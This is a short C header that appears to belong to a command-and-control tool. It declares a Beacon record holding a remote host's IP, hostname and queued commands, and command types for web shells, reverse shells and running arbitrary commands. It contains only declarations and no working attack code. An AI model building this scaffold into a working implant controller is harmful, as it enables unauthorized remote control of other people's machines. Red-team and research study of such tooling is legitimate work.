#include <stdbool.h>

enum CommandType {
    WebShell,
    RevShell,
    Run,
};
enum CommandType parse_command_type(char* s);
char* unparse_command_type(enum CommandType type);

struct Command {
    int id;
    int beacon_id;
    enum CommandType type;
    char* arg;
    bool executed;
    char* result;
};
void run_command(struct Command* command);

struct Beacon {
    int id;
    char* ip;
    char* hostname;
    struct Command** commands;
    int len_commands;
};
